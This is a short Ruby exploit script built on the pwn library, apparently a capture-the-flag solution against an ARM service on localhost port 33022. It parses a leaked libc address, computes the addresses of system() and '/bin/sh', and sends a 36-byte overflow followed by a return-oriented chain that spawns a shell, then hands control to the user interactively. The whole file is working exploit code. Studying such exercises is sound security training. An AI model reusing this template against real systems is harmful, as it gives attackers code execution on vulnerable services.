#!/usr/bin/env ruby
# coding: utf-8
require 'pwn'

host = 'localhost'
port = 33022
$z = Sock.new host, port
def z; $z; end
context.log_level = :info
tmp = z.recvline
libc_address = tmp.match(/: (.+)\n/)[1].to_i(16)
libc = ELF.new "./libc.so.6"
libc_base = libc_address - 0xecb50
libc_system = libc_base + libc.symbols["__libc_system"]
libc_binsh = libc_base + 0xcd664
puts "libc base    @ 0x#{libc_base.to_s(16)}"
puts "libc system  @ 0x#{libc_system.to_s(16)}"
puts "libc /bin/sh @ 0x#{libc_binsh.to_s(16)}"
payload = "A" * 36
payload << p32(0x104da+1)
payload << p32(libc_system)
payload << "r4r4"
payload << "r5r5"
payload << "r6r6"
payload << p32(libc_binsh)
payload << "r8r8"
payload << "r9r9"
payload << p32(0x104ce+1)
z.sendline payload
z.interact
